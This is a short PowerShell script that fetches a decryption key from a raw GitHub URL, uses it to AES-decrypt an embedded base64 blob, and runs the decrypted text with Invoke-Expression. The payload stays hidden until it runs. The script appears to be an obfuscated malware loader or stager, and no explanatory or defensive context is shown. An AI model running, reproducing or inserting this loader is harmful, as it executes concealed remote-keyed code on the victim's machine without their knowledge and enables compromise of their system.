$keyUrl = "https://raw.githubusercontent.com/obirn/aaa/refs/heads/main/key"
$keyString = (Invoke-WebRequest -Uri $keyUrl -UseBasicParsing).Content.Trim()
$key = [System.Text.Encoding]::UTF8.GetBytes($keyString)
$iv = [byte[]]::new(16)
$encryptedBase64 = "FO4aL6nI2QE67bkUVhfd/7vUSn3SDnCXZTA1d2XCgxF6pz/4jNiT/kxsxkibLhLwZOTENhjzIuYUHZ5ijfTEVFhxdlDZ1qlVIAx+6Mlrs0AxaXPVv8MyV8TzC9AnbrYaGVsKb+spafztSPBM8S2g/yycTPwP2C0RnggBcbVW5pEXNdyIWO5GX2k8Lt1WYRluqVckcKixPqE7DhMScVayIKx/Y/Vgnfp4At+bnnyItoGmTJEOe/7NjPfhZ2n3NSHE3O7y8iNJEicCS1ffyU2YEvYW6NPiam3FG7OcP1nXaya0Pht+fEOVjbOU1vKmSYsWYK080y3f+CM5JrSkUiAU7iiQzc7Mwv5FKi+4CmC4DMmcWO+2ByMlWsamArSZgkcXLkabH4k3kGD4+PZTeuROuWk9JWNAj/8R9gPvi0rTViMkVpF/cf5RXHvZokm7U3V2C0ehEDeSt0vHkrDtwoXdjFMtjgQr4tJ+gWK6lgk97hJ4pMOl0vhx6UTbNzEISu07KBIID7rxKrBF1KOIc1TUYxGHqYXmhtp3JZZJvGRWzFjbcnZUJ+m+a9nqYUJGWe36z+Jp3MQy5PZwZZrNSBkecUlWR7YX52kx8/ftmxb4XDqU24uQDlJCvNvAgLM2YVAO806kEBUYkd6BVV1oP7+1Ww=="
$encryptedBytes = [System.Convert]::FromBase64String($encryptedBase64)
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.Key = $key
$aes.IV = $iv
$decryptor = $aes.CreateDecryptor()
$decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
$decryptedCommand = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
Invoke-Expression $decryptedCommand
